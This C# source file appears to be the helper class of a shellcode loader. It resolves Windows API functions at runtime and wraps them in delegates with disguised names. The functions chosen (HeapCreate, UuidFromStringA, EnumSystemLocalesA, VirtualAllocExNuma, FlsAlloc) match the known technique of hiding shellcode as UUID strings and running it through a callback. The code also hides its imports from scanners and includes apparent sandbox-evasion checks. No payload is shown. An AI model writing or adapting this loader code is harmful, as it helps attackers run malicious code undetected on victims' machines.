using System;
using System.Runtime.InteropServices;

public class DInvoke
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    // Kernel32 Dynamic Loading
    public static IntPtr hkernel32 = LoadLibrary("kernel32.dll");
    
    // rpcrt4.dll Dynamic Loading
    public static IntPtr hRpcrt4 = LoadLibrary("rpcrt4.dll");

    // HeapCreate
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr dHeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);
    public static dHeapCreate notHeapCreate = (dHeapCreate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hkernel32, "HeapCreate"), typeof(dHeapCreate));

    // UuidFromStringA
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr dUuidFromStringA(string StringUuid, IntPtr heapPointer);
    public static dUuidFromStringA notUuidFromStringA = (dUuidFromStringA) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hRpcrt4, "UuidFromStringA"), typeof(dUuidFromStringA));
    
    // EnumSystemLocalesA
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool dEnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
    public static dEnumSystemLocalesA notEnumSystemLocalesA = (dEnumSystemLocalesA) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hkernel32, "EnumSystemLocalesA"), typeof(dEnumSystemLocalesA));
    
    // GetCurrentProcess
    public delegate IntPtr GetCurrentProcess();
    public static GetCurrentProcess notGetCurrentProcess = (GetCurrentProcess) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hkernel32, "GetCurrentProcess"), typeof(GetCurrentProcess));
    
    // VirtualAllocExNuma
    public delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    public static VirtualAllocExNuma notVirtualAllocExNuma = (VirtualAllocExNuma) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hkernel32, "VirtualAllocExNuma"), typeof(VirtualAllocExNuma));
    
    // FlsAlloc
    public delegate IntPtr FlsAlloc(IntPtr callback);
    public static FlsAlloc notFlsAlloc = (FlsAlloc) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hkernel32, "FlsAlloc"), typeof(FlsAlloc));
}
